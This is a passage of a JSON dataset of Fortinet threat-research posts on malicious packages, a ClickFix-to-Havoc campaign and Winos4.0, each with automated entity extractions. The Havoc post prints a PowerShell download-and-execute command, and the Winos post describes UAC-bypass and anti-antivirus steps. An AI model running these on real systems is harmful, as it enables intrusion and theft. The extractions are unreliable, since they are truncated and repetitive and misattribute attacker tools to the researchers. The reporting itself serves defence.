complex, multi-layered attacks that involve combining files, network code, and process execution, attackers are leveraging increasingly sophisticated methods to breach systems. As cybersecurity threats evolve, it’s crucial for organizations and individuals to stay informed about the latest threats. Proactive defense measures such as regular system updates, advanced threat detection, and user education on identifying suspicious activity are essential in mitigating these growing risks. Stay vigilant and protect your systems from these emerging threats. FortiGuard AntiVirusdetects the malicious files identified in this report as: AffineQuant-99.6/main.py : Python/Agent.EBC2!traffineQuant-99.6: Python/Agent.EBC2!tramzn-aws-glue-ml-libs-python-6.1.5/setup.py: Python/Agent.D31D!tramzn-aws-glue-ml-libs-python-6.1.5:Python/Agent.D31D!tramzn-awsglue-6.1.4/setup.py: Python/Agent.8960!trAmzn-awsglue-6.1.4: Python/Agent.8960!trseller-admin-common_6.5.8/index.js: JS/Agent.409D!trSeller-admin-common_6.5.8: JS/Agent.409D!trseller-rn-mng-lib_6.5.8/index.js: JS/Agent.409D!trSeller-rn-mng-lib_6.5.8: JS/Agent.409D!trxeno.dll_1.0.2/index.js: JS/Agent.B3EF!trXeno.dll_1.0.2: JS/Agent.B3EF!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. TheFortiGuard Web FilteringService detects and blocks the download URLs cited in this report as Malicious. TheFortiDevSecSCA scanner detects malicious packages, including those cited in this report that may operate as dependencies in users' projects in test phases, and prevents those dependencies from being introduced into users' products. If you believe these or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. Package/file name Sha256 Detection affineQuant-99.6/main.py a7ba9a1eef84ae8dad8ed328c41fe4346df402a003ff7cef5e7cbd592c29f4de Python/Agent.EBC2!tr affineQuant-99.6 8fe3eee65782c61111354a0a2a58da04901c7b416d3b7634aa605e1939dde531 Python/Agent.EBC2!tr amzn-aws-glue-ml-libs-python-6.1.5/setup.py 2420fa98a183da4153e4de00e401efa19c62fe9ed631d980315b0b719221aec4 Python/Agent.D31D!tr amzn-aws-glue-ml-libs-python-6.1.5 05e9226714f29fbe526820d35c8011f86297444ec581d16d60b38bb55b20fa91 Python/Agent.D31D!tr amzn-awsglue-6.1.4/setup.py ba0ac1985fb931110899402ce44f11c5d75161cb69ff3d0e9357000ef631a2e1 Python/Agent.8960!tr amzn-awsglue-6.1.4 351bd6e977884f050bdb348239cfd20e0cc9b9a7a6aa3b3aa21e3bed0b072afe Python/Agent.8960!tr seller-admin-common_6.5.8/index.js 3fe14fc83121fdc05efdcc0c1c4d532ca501644a952399b27a6e1bdd6cfed2b7 JS/Agent.409D!tr seller-admin-common_6.5.8 3fe14fc83121fdc05efdcc0c1c4d532ca501644a952399b27a6e1bdd6cfed2b7 JS/Agent.409D!tr seller-rn-mng-lib_6.5.8/index.js 920da0917dbf7ead5531406b324de83656c90a39176f5377c123fe36d257668b JS/Agent.409D!tr seller-rn-mng-lib_6.5.8 673db52c28aac71f8cf80ee1718b8ea98e1f8e0b3f1293da15fd26c4e6343927 JS/Agent.409D!tr xeno.dll_1.0.2/index.js 6a68848e118ec280d01a1dc989e8d67ca10b3f14aab98eb87a23b340c863fdcf JS/Agent.B3EF!tr xeno.dll_1.0.2 973a87cc0baa17c53a17467e188d82241458f7ff1e70e920014eaf2bacbe3a07 JS/Agent.B3EF!tr malware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs, Organization), (Malicious Software Packages, File), (November 2024, Date), (OSS malware detection system, Tool), (Automated threat detection platform, Tool), (2025 Global Threat Landscape Report, Document), (Attackers, Attacker), (Obfuscation, Technique), (Install Scripts, Technique), (Typosquatting, Technique)\nRelationships: (FortiGuard Labs, analyzes, Malicious Software Packages), (FortiGuard Labs, uses, OSS malware detection system), (FortiGuard Labs, uses, Automated threat detection platform), (Malicious Software Packages, detectedFrom, November 2024), (Malicious Software Packages, identifiedBy, FortiGuard Labs), (Malicious Software Packages, trackedBy, FortiGuard Labs), (Malicious Software Packages, examinedBy, FortiGuard Labs), (Attackers, employ, Obfuscation), (Attackers, employ, Install Scripts), (Attackers, employ, Typosquatting)",
      "entities": [
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "Malicious Software Packages",
          "File"
        ],
        [
          "November 2024",
          "Date"
        ],
        [
          "OSS malware detection system",
          "Tool"
        ],
        [
          "Automated threat detection platform",
          "Tool"
        ],
        [
          "2025 Global Threat Landscape Report",
          "Document"
        ],
        [
          "Attackers",
          "Attacker"
        ],
        [
          "Obfuscation",
          "Technique"
        ],
        [
          "Install Scripts",
          "Technique"
        ],
        [
          "Typosquatting",
          "Technique"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs",
          "analyzes",
          "Malicious Software Packages"
        ],
        [
          "FortiGuard Labs",
          "uses",
          "OSS malware detection system"
        ],
        [
          "FortiGuard Labs",
          "uses",
          "Automated threat detection platform"
        ],
        [
          "Malicious Software Packages",
          "detectedFrom",
          "November 2024"
        ],
        [
          "Malicious Software Packages",
          "identifiedBy",
          "FortiGuard Labs"
        ],
        [
          "Malicious Software Packages",
          "trackedBy",
          "FortiGuard Labs"
        ],
        [
          "Malicious Software Packages",
          "examinedBy",
          "FortiGuard Labs"
        ],
        [
          "Attackers",
          "employ",
          "Obfuscation"
        ],
        [
          "Attackers",
          "employ",
          "Install Scripts"
        ],
        [
          "Attackers",
          "employ",
          "Typosquatting"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 10,
    "relationship_count": 10
  },
  {
    "title": "Havoc: SharePoint with Microsoft Graph API turns into FUD C2",
    "link": "https://www.fortinet.com/blog/threat-research/havoc-sharepoint-with-microsoft-graph-api-turns-into-fud-c2",
    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Any organizationImpact:Attackers gain control of the infected systemsSeverity level:High Havoc is a powerful command-and-control (C2) framework. Like other well-known C2 frameworks, such asCobalt Strike,Silver, andWinos4.0, Havoc has been used inthreat campaignsto gain full control over the target. Additionally, It is open-source and available on GitHub, making it easier for threat actors to modify it to evade detection. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. FortiGuard Labs recently discovered a phishing campaign that combines ClickFix and multi-stage malware to deploy a modified Havoc Demon Agent. The threat actor hides each malware stage behind a SharePoint site and uses a modified version of Havoc Demon in conjunction with the Microsoft Graph API to obscure C2 communications within trusted, well-known services. Figure 1 shows the attack chain. The attack campaign starts with a phishing email containing an HTML file as an attachment, as illustrated in Figure 2. It uses a brief explanation and an urgent tone to prompt the recipient to open the attachment immediately. The attachment, “Documents.html,” is a ClickFix attack that embeds a fake error message and instructions in HTML to deceive users into copying and pasting a malicious PowerShell command into their terminal or PowerShell, ultimately executing malicious code. Decoding the base64-encoded string shown in Figure 3 reveals a PowerShell command that downloads and executes a remote PowerShell script. powershell -w h -c \"iwr ‘hxxps://hao771[.]sharepoint.com/_layouts/15/download.aspx?share=EU7smZuKo-pDixZ26BSAaX0BVVcF5VkOc7qEvjsDSAH9OQ'|iex\" The Script file is hosted in SharePoint and controlled by the threat actor. When the script runs, it checks whether the execution environment is a sandbox by verifying the number of domain computers. It then deletes all registry entries under HKCU:\\Software\\Microsoft with names starting with \"zr_\" and adds the specified property as an infection marker, as shown in Figure 4. Next, the script verifies the existence of pythonw.exe. If it’s not found, it downloads the Python interpreter. Otherwise, it directly runs the Python script. Finally, the remote Python script is retrieved and executed in hidden windows to obscure malicious activity, as shown in Figure 5. Like the PowerShell script, the Python script is hosted on the same SharePoint. It contains debug information written in Russian and serves as a shellcode loader. We executed the script directly with the Python interpreter in the terminal. The log displays “Выделение памяти” (memory allocation), \"Запись в память” (write to memory), \"Выполнение shellcode” (execution of shellcode), and \" Завершение выполнения скрипта” (script execution completion) in sequence, indicating successful shellcode execution, as seen in Figure 6. KaynLdr is a Github Shellcode Loader designed to reflectively load an embedded DLL. It complicates analysis by using API hashing with a modified DJB2 algorithm and leverages resolved ntdll APIs for memory allocation and mapping. The instruction “call rax” executes the embedded DLL's entry point, as shown in Figure 7. Havoc is an open-source post-exploitation command and control framework used in red teaming exercises andattack campaignsto gain complete control over compromised targets. In this attack campaign, we observed that the threat actor uses Havoc in conjunction with the Microsoft Graph API to conceal C2 communication within well-known services. The modified Havoc Demon DLL still starts with DemonInit and uses the same hash algorithm as KaynLdr to retrieve the necessary APIs and initialize the configuration objects. The second function, “SharePointC2Init,” initializes files on the actors' SharePoint site using the Microsoft Graph API. It first combines the hardcoded shared secret with the necessary parameters for a POST request. It then sends the request to the /token endpoint of the Microsoft Identity Platform to obtain access tokens for Microsoft Graph APIs. Next, it utilizes the obtained token to create two files in SharePoint's default document library by making a PUT request, as shown in Figure 10. The Havoc AgentID generates the VictimID as a filename, concatenated with the suffix “pD9-tKout/pD9-tKin” to indicate their purpose. The initial packet sent to C2 is a CheckIn request containing data gathered from the DemonMetaData function. In this step, the victim's information—such as Host Name, User Name, Domain Name, IP Address, Process Details, OS Information, whether the user has an elevated account, and the configuration in the Demon DLL—is sent to the C2 server. All content is encrypted using the AES-256 algorithm in CTR mode with a randomly generated 256-bit key and a 128-bit IV. Finally, it is combined with the header, as illustrated in Figure 11, before being sent to the C2 server via the TransportSend function. The TransportSend function has been modified to communicate with the C2 by accessing two files: {VictimID}pD9-tKout and {VictimID}pD9-tKin. It updates the request to the “{VictimID}pD9-tKout” file and then retrieves the response from the C2 by using Microsoft Graph API with the GET method to access the contents of the ‘{VictimID}pD9-tKin’ file. If the response is successfully retrieved, the content of file '{VictimID}pD9-tKin' is immediately erased. Next, the content in the response is compared with the AgentID. If they match, the session.connected flag is set, and it enters the dispatcher routine to await new tasks from the attacker. In the dispatcher routine, the agent sends a 'Get Job' request and parses the response into Command ID, Request ID, and task. Although we only observed DEMON_COMMAND_NO_JOB (Command ID: 0xA) during our analysis, as shown in below, we found that the task would be decrypted and executed if a different command ID exists and is not 0xA in the program. The supported commands are the same as those in Havoc Github, as shown in Figure 14. They include gathering information about the target, file operations, command and payload execution, token manipulation, and Kerberos Attacks. In addition to staying alert for phishing emails, guided messages that encourage opening a terminal or PowerShell must be handled with extra caution to prevent inadvertently downloading and executing malicious commands. In this article, we uncovered the execution flow and the altered open-source post-exploitation framework used in this attack. Public services once again play a crucial role in the attack campaign, now further integrated with modified Havoc Demon to hide malicious communication within the Microsoft Graph API, making identification and detection even more challenging. The malware described in this report are detected and blocked byFortiGuard Antivirusas: HTML/Agent.A5D4!trPowerShell/MalwThreat!ebc5FTPython/Agent.DF60!trW64/Havoc.L!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard CDR(content disarm and reconstruction) service can disarm the malicious macros within the document. FortiGuard Labs provides theBackdoor.Havoc.AgentIPS signature to block Havoc C2 network communications. We also suggest that organizations take the free FortinetFortinet Certified Fundamentals (FCF)cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact the GlobalFortiGuard Incident Response Team. hao771[.]sharepoint.com 51796effe230d9eca8ec33eb17de9c27e9e96ab52e788e3a9965528be2902330989f58c86343704f143c0d9e16893fad98843b932740b113e8b2f8376859d2ddA5210aaa9eb51e866d9c2ef17f55c0526732eacb1a412b910394b6b51246b7dacc151456cf7df7ff43113e5f82c4ce89434ab40e68cd6fb362e4ae4f70ce65b3 C2 server FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs, Company), (Threat Research, Topic), (Microsoft Windows, Platform), (Any organization, Target), (Attackers, Actor), (Havoc, Malware), (ClickFix, Tool), (multi-stage malware, Malware), (modified Havoc Demon Agent, File), (SharePoint, Tool), (Microsoft Graph API, Tool), (Figure 1, Diagram), (Figure 2, Diagram)\nRelationships: (FortiGuard Labs, publishes, 2025 Global Threat Landscape Report), (FortiGuard Labs, discovers, phishing campaign), (FortiGuard Labs, uses, ClickFix), (FortiGuard Labs, uses, multi-stage malware), (FortiGuard Labs, uses, modified Havoc Demon Agent), (FortiGuard Labs, uses, SharePoint), (FortiGuard Labs, uses, Microsoft Graph API), (FortiGuard Labs, uses, Figure 1), (FortiGuard Labs, uses, Figure 2), (FortiGuard Labs, uses, ClickFix), (FortiGuard Labs, uses, multi-stage malware), (FortiGuard Labs, uses, modified Havoc Demon Agent), (FortiGuard Labs, uses, SharePoint), (FortiGuard Labs, uses, Microsoft Graph API), (FortiGuard Labs, uses, Figure 1), (FortiGuard Labs, uses, Figure 2), (FortiGuard Labs, uses,",
      "entities": [
        [
          "FortiGuard Labs",
          "Company"
        ],
        [
          "Threat Research",
          "Topic"
        ],
        [
          "Microsoft Windows",
          "Platform"
        ],
        [
          "Any organization",
          "Target"
        ],
        [
          "Attackers",
          "Actor"
        ],
        [
          "Havoc",
          "Malware"
        ],
        [
          "ClickFix",
          "Tool"
        ],
        [
          "multi-stage malware",
          "Malware"
        ],
        [
          "modified Havoc Demon Agent",
          "File"
        ],
        [
          "SharePoint",
          "Tool"
        ],
        [
          "Microsoft Graph API",
          "Tool"
        ],
        [
          "Figure 1",
          "Diagram"
        ],
        [
          "Figure 2",
          "Diagram"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs",
          "publishes",
          "2025 Global Threat Landscape Report"
        ],
        [
          "FortiGuard Labs",
          "discovers",
          "phishing campaign"
        ],
        [
          "FortiGuard Labs",
          "uses",
          "ClickFix"
        ],
        [
          "FortiGuard Labs",
          "uses",
          "multi-stage malware"
        ],
        [
          "FortiGuard Labs",
          "uses",
          "modified Havoc Demon Agent"
        ],
        [
          "FortiGuard Labs",
          "uses",
          "SharePoint"
        ],
        [
          "FortiGuard Labs",
          "uses",
          "Microsoft Graph API"
        ],
        [
          "FortiGuard Labs",
          "uses",
          "Figure 1"
        ],
        [
          "FortiGuard Labs",
          "uses",
          "Figure 2"
        ],
        [
          "FortiGuard Labs",
          "uses",
          "ClickFix"
        ],
        [
          "FortiGuard Labs",
          "uses",
          "multi-stage malware"
        ],
        [
          "FortiGuard Labs",
          "uses",
          "modified Havoc Demon Agent"
        ],
        [
          "FortiGuard Labs",
          "uses",
          "SharePoint"
        ],
        [
          "FortiGuard Labs",
          "uses",
          "Microsoft Graph API"
        ],
        [
          "FortiGuard Labs",
          "uses",
          "Figure 1"
        ],
        [
          "FortiGuard Labs",
          "uses",
          "Figure 2"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 13,
    "relationship_count": 16
  },
  {
    "title": "Winos 4.0 Spreads via Impersonation of Official Email to Target Users in Taiwan",
    "link": "https://www.fortinet.com/blog/threat-research/winos-spreads-via-impersonation-of-official-email-to-target-users-in-taiwan",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High In January 2025, FortiGuard Labs observed an attack that used Winos4.0, an advanced malware framework actively used in recent threat campaigns, to target companies in Taiwan. Figure 1 shows an example of the attack chain. Usually, there is a loader that is only used to load the malicious DLL file, and the Winos4.0 module is extracted from the shellcode downloaded from its C2 server. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. According  to a report released in November 2024, Winos4.0 was distributed through gaming-related applications, however, it spread via an email masquerading as from Taiwan's National Taxation Bureau in the campaign in January 2025. The sender claimed that the malicious file attached was a list of enterprises scheduled for tax inspection and asked the receiver to forward the information to their company's treasurer. The attachment also masquerades as an official document from the Ministry of Finance. It asks the victim to download the attached list of enterprises slated for tax inspection. However, the list is a ZIP file containing malicious DLL for the next attack stage. The files in the ZIP file are executed in the following sequence: 20250109.exe, ApowerREC.exe, and lastbld2Base.dll. 20250109.exe is a launcher originally used to execute the actual APowerREC.exe in ./app/ProgramFiles. The attacker created the same folder structure in the ZIP file and used a loader to replace ApowerREC.exe. The fake ApowerREC.exe does nothing but call a function imported from lastbld2Base.dll. When an executable file is run, it loads all necessary DLL files and executes their entry functions. As a result, the DLLMain function of lastbld2Base.dll, where the malicious code is located, is loaded when the fake ApowerREC.exe is executed. Lastbld2Base.dll decrypts its data to get the shellcode for the next stage. At the bottom of the shellcode are configurations, including the IP address of the C2 server, the name of the base registry key for the next stage, and flags for features for the current stage. The optional features include permission evaluation, hiding the window of the current process, and anti-sandbox functions. If higher permission is needed in this attack, it tests the current permissions by opening the registry key HKEY_LOCAL_MACHINE\\SOFTWARE and executing ApowerREC.exe as an administrator. For the anti-sandbox function, it takes two screenshots within a two-second interval. If there are more than 20,000 different pixels in the second screenshot, which means a user is active on the computer, it performs its remaining tasks. Otherwise, it continues taking screenshot and compares it with the first one for at most one hour. After the optional features are run, it downloads the encrypted shellcode data and the Winos4.0 module from its C2 server. The encrypted data is written to HKEY_CURRENT_USER\\B118D5E900008F7A, the base registry for configurations in the next stage, with a value name of “0”. After this, it decrypts the data to get the shellcode, followed by partially decrypted data of the module. The new shellcode decrypts the data with another algorithm to get a DLL file and parses its export table to get the address of the only export function. In this attack, the module from the C2 server creates eight threads to perform different tasks: MainThread, CloseWindow, Screenshot, Keylog, Clipboard, USB, ReadReg, and Anti-AV. Mutex: Global\\MainThreadB118D5E900008F7AThe MainThread creates the remaining seven threads. In addition, it performs the following actions: API Constant Description SystemParametersInfoW SPI_SETSCREENSAVEACTIVE Deactivates the screen saver SetThreadExecutionState ES_CONTINUOUS ES_AWAYMODE_REQUIRED ES_SYSTEM_REQUIRED Enables the Away mode so the program keeps working while the computer appears to be sleeping PowerSetRequest PowerRequestDisplayRequired The display remains on even if the computer is idle Registry key: SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System Value name: ConsentPromptBehaviorAdmin Value: 0 Description: Allows the Consent Admin to perform an operation that requires elevation without consent or credentials. Registry key: SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System Value name: PromptOnSecureDesktop Value: 0 Description: Disables secure desktop prompting Mutex: Global\\ClosewWindowIt calls theEnumWindowsfunction to enumerate all visible windows to find the windows of kxecenter(Kingsoft Security) and HipsTray(Huorong). It checks the window's width to ensure it is the security prompt window. When the target window is found, it clicks the \"Permit\" button on the prompt window. Mutex: Global\\ScreenShotB118D5E900008F7AIt takes screenshots of applications that contain the keywords stored in the valuepicshotdataof HKEY_CURRENT_USER\\B118D5E900008F7A, and the screenshots are saved to C:\\ProgramData\\B118D5E900008F7A\\{keyword}\\{Date}.Ifpicshotdatadoesn’t exist, this thread will not be executed. Mutex: Global\\KeylogB118D5E900008F7AIt keeps checking the value of theKEYLOGof HKEY_CURRENT_USER\\B118D5E900008F7A. If the value is 1, it creates a mutex C:\\ProgramData\\B118D5E900008F7A\\Regedit.log and starts recording the user's keystrokes and the contents in the clipboard. The data is written to C:\\ProgramData\\B118D5E900008F7A\\Regedit.log. Mutex: Global\\ClipboardB118D5E900008F7AIt replaces keywords in the clipboard with the text stored in the registry value clipboarddata of HKEY_CURRENT_USER\\B118D5E900008F7A. The value contains three properties: Mode, Expression, and Replace. When Mode is “Modify,” Expression specifies the pattern to look for in the clipboard, and Replace specifies the replacement.If clipboarddata doesn’t exist, this thread will not be executed. Mutex: Global\\UsbB118D5E900008F7AIt collects the names of connected USB devices every three seconds except for those that include the following keywords: mouse, keyboard, wlan, lenovo, and sanmsung (misspelling of samsung). If a new USB device is inserted or removed, it updates the device list with a Chinese annotation that means “USB device inserted” or “USB device removed.” It reads the value B118D5E900008F7A0 from HKCU\\Console to get the shellcode and execute it every five seconds. First, it bypasses the UAC prompt by modifying the registry key values mentioned in MainThread. Then, it callsGetTcpTable2to obtain active TCP connections. If a TCP connection is owned by 360Safe, Kingsoft, or Huorong processes, it disables it. There are other attack chains used in this campaign. The查看10.exe(view10) is compiled from a Python script by Nuitka, and it loads Python311.dll, which is the malicious file. The shellcode from Python311.dll decrypts its data to get a DLL file that writes another shellcode to the registry value ofhrqnmlb{XXXXXX}of the HKCU\\Console\\, and the shellcode is also saved as bb.jpg in C:\\Users\\Public\\Download. The shellcode plays the same role as the shellcode from lastbld2Base.dll we mentioned above. However, its marker string is used by a version preceding the one described in areportreleased in November 2024. Another point worth mentioning is that the DLL contains multiple snippets of shellcode that are identical to Figure 13 except for the C2 domain. While only  9010[.]360sdgg[.]com is used in this attack, other domains have been observed in different campaigns. The 上线模块.dll(online module) is used to take screenshots of WeChat and the online bank, and the akagi.exe is a module of UACMe. Winos4.0 makes good use of registry keys. The C2 server writes most configurations for optional features and encrypts data to the values of the base registry key and its subkeys. This provides the flexibility of optional features. However, it’s also a good hint for forensic analysis. We can rebuild files from the data and perform further analysis. FortiGuard will continue monitoring these attack campaigns and providing appropriate protections as required. The malware described in this report is detected and blocked byFortiGuard Antivirusas: PDF/Agent.A6DC!tr.dldrW32/Agent.7BBA!trW64/UACMe.O!trW64/ValleyRat.A!tr.spy FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuard CDR (content disarm and reconstruction) service, which runs on both FortiGate and FortiMail, can disarm the malicious macros in the document. We also suggest that organizations go through Fortinet’s freeNSE trainingmodule:FCF Fortinet Certified Fundamentals. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. 43[.]137[.]42[.]254206[.]238[.]221[.]60206[.]238[.]221[.]240124[.]156[.]100[.]172206[.]238[.]221[.]244 1234[.]360sdgg[.]com9001[.]360sdgg[.]com9002[.]360sdgg[.]com9003[.]360sdgg[.]com9005[.]360sdgg[.]com9006[.]360sdgg[.]com9007[.]360sdgg[.]com9009[.]360sdgg[.]com9010[.]360sdgg[.]comffggssa-1329400280[.]cos[.]ap-guangzhou[.]myqcloud[.]comfuued5-1329400280[.]cos[.]ap-guangzhou[.]myqcloud[.]com0107-1333855056[.]cos[.]ap-guangzhou[.]myqcloud[.]comrgghrt1140120-1336065333[.]cos[.]ap-guangzhou[.]myqcloud[.]comhei-1333855056[.]cos[.]ap-guangzhou[.]myqcloud[.]comchakan202501-1329400280[.]cos[.]ap-guangzhou[.]myqcloud[.]comwrwyrdujtw114117-1336065333[.]cos[.]ap-guangzhou[.]myqcloud[.]comfdsjg114-1336065333[.]cos[.]ap-guangzhou[.]myqcloud[.]comsjujfde-1329400280[.]cos[.]ap-guangzhou[.]myqcloud[.]comhtrfe4-1329400280[.]cos[.]ap-guangzhou[.]myqcloud[.]com0611-1333855056[.]cos[.]ap-guangzhou[.]myqcloud[.]comtwzfw[.]vip 36afc6d5dfb0257b3b053373e91c9a0a726c7d269211bc937704349a6b4be9b90e3c9af7066ec72406eac25cca0b312894f02d6d08245a3ccef5c029bc297bd267395af91263f71cd600961a1fd33ddc222958e83094afdde916190a0dd5d79cf4d3477a19ff468d234a5e39652157b2181c8b51c754b900bcfa13339f577e7cc9a8db23d089aa71466b4bde51a51a8cfdcc28e8df33b4c63ce867bd381e5fe5 e2b75baeb7ed21fb8f27984f941286770d1c3c0b60fce8d7fa5b167bd24ba6dcdffbeefc632b20d2ef867553684e9971ab76e1223e743604a5275713423b616820c34b5f0983021414b168913c3da267caf298d8f0f5e3ec0ce97db5f4f483166c33715a14fdc917b5b09b6e1b5dad07bb769493eafbf7ca1023830b4059e00375a4d75c35724140149c9c5056c1bcbd328bbe1e5d1d1ef34205ed5442d2b348fed394a3653b7c6fcc1b277eda6e18eb0983a7e024be5b51e5188b3cfb9512e8a067d848f099e6d1e465f9761a5b85392d550303bfa75fac920d444fd980c949c55757075259fa4be6941dd273c4a4a2fcc29e6ba427dec124b25b299b3505fe64a876e6cb3cf3122febc84a00ec3e0740c054cff955164971c470e1b5e5f1bbd4ac82de8dda9796579cd8ea0f84b43c7a980cdb0e9cdb8abe8981a2d215ed2f(20c34b5f0983021414b168913c3da267caf298d8f0f5e3ec0ce97db5f4f48316 Corrupt) 268c72f5482374660a132d1b91cac0c04b4724a214db4f052eb421e36c2829210a4bbb998bd3a3bcc72cf759689a5656dc74590b731d0affbfc317cf484ed28b79c64d2e77acdbcdbd35cbb29497941335d7e3ab6ebb474064f095e745f0d6437f22305679e46e1fd5043beb136108197c0921643ce0d680f990a3018ade485b594d907855d35ee7689a568e4ac43e4e0ed90de047d91b0253ef79da71ecbc081f3b041eee1ece8cf6aa5c742aeb8c0ac2266cccecca7888772509227c4f8669514933468ac1dd9f7db4e2693f1be7f84deb35c33f8f9934fad32caaae9ef6117a5b26f6dd7b8e0d648e9804ec932603b7d7a5f76c7a8c537ab0c2be54f51fa98b1b9a789136ca3abe25938204845c351aaf0c97c0708ade8d4d8ba4ded95ba71ad1f2eec961bc7a35abeac486f843b7caece0929b13f1dab47fbdc0406ac4e34c1ea827713f1eb57cc0e8e9d171d4e21d116f846b174bc05114eef5674c96531a342426d59e7fdc4abfb74c2225f68382172e03b0f8d496a57ae647411f0fbd2ce73cbfab0beb3663c0151ba7c310e4dbf69f295d8a18114435506483d774ac0a4bbb998bd3a3bcc72cf759689a5656dc74590b731d0affbfc317cf484ed28b514933468ac1dd9f7db4e2693f1be7f84deb35c33f8f9934fad32caaae9ef61176ac08358f230bca3e8b8448b3c177094aeac25402b929f5f73869ec77173a44 advanced malware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs, Organization), (Winos4.0, Malware), (Taiwan, Country), (gaming-related applications, Tool), (email, Communication medium), (National Taxation Bureau, Organization), (Ministry of Finance, Organization), (ZIP file, File), (Malicious DLL, File)\\nRelationships: (FortiGuard Labs, publishes, 2025 Global Threat Landscape Report), (Winos4.0, uses, Malware Framework), (Winos4.0, communicatedBy, C2 Server), (Winos4.0, containedIn, Shellcode), (Winos4.0, usedBy, Loader), (Winos4.0, usedBy, Module), (Winos4.0, usedBy, Targeted Companies), (Winos4.0, usedBy, Email Masquerade), (Winos4.0, usedBy, Email Attachment), (Winos4.0, usedBy, Email Sender Claim), (Winos4.0, usedBy, Email Receiver Forward), (Winos4.0, usedBy, Email Company Treasurer), (Winos4.0, usedBy, Email List Scheduling), (Winos4.0, usedBy, Email Official Document), (Winos4.0, usedBy, Email Download Request), (Winos4.0, usedBy, Email Forwarding), (Winos",
      "entities": [
        [
          "FortiGuard Labs",
          "Organization"
        ],
        [
          "Winos4.0",
          "Malware"
        ],
        [
          "Taiwan",
          "Country"
        ],
        [
          "gaming-related applications",
          "Tool"
        ],
        [
          "email",
          "Communication medium"
        ],
        [
          "National Taxation Bureau",
          "Organization"
        ],
        [
          "Ministry of Finance",
          "Organization"
        ],
        [
          "ZIP file",
          "File"
        ],
        [
          "Malicious DLL",
          "File"
        ],
        [
          "FortiGuard Labs",
          "publishes",
          "2025 Global Threat Landscape Report"
        ],
        [
          "Winos4.0",
          "uses",
          "Malware Framework"
        ],
        [
          "Winos4.0",
          "communicatedBy",
          "C2 Server"
        ],
        [
          "Winos4.0",
          "containedIn",
          "Shellcode"
        ],
        [
          "Winos4.0",
          "usedBy",
          "Loader"
        ],
        [
          "Winos4.0",
          "usedBy",
          "Module"
        ],
        [
          "Winos4.0",
          "usedBy",
          "Targeted Companies"
        ],
        [
          "Winos4.0",
          "usedBy",
          "Email Masquerade"
        ],
        [
          "Winos4.0",
          "usedBy",
          "Email Attachment"
        ],
        [
          "Winos4.0",
          "usedBy",
          "Email Sender Claim"
        ],
        [
          "Winos4.0",
          "usedBy",
          "Email Receiver Forward"
        ],
        [
          "Winos4.0",
          "usedBy",
          "Email Company Treasurer"
        ],
        [
          "Winos4.0",
          "usedBy",
          "Email List Scheduling"
        ],
        [
          "Winos4.0",
          "usedBy",
          "Email Official Document"
        ],
        [
          "Winos4.0",
          "usedBy",
          "Email Download Request"
        ],
        [
          "Winos4.0",
          "usedBy",
          "Email Forwarding"
        ]
      ],
      "relationships": [],
      "has_entities": true
    },
    "entity_count": 25,
    "relationship_count": 0
  },
  {
    "title": "FortiSandbox 5.0 Detects Evolving Snake Keylogger Variant",
    "link": "https://www.fortinet.com/blog/threat-research/fortisandbox-detects-evolving-snake-keylogger-variant",
    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Windows usersImpact:Silently records keystrokes to collect credentials, data, and other sensitive informationSeverity level:High FortiGuard Labs leveraged the advanced capabilities of FortiSandbox v5.0 (FSAv5) to detect a new variant of the Snake Keylogger (also known as 404 Keylogger). This malware, identified as AutoIt/Injector.GTY!tr, has been responsible for over 280 million blocked infection attempts, highlighting its extensive reach across regions. The majority of these detections have been concentrated in China, Turkey, Indonesia, Taiwan, and Spain, suggesting a significant impact in these areas. This high volume of detections underscores the malware’s ongoing global threat and its potential to affect organizations and users worldwide. The recent surge in activity also highlights the continuous evolution of keylogger malware and the need for advanced detection mechanisms. Typically delivered through phishing emails containing malicious attachments or links, Snake Keylogger is designed to steal sensitive information from popular web browsers like Chrome, Edge, and 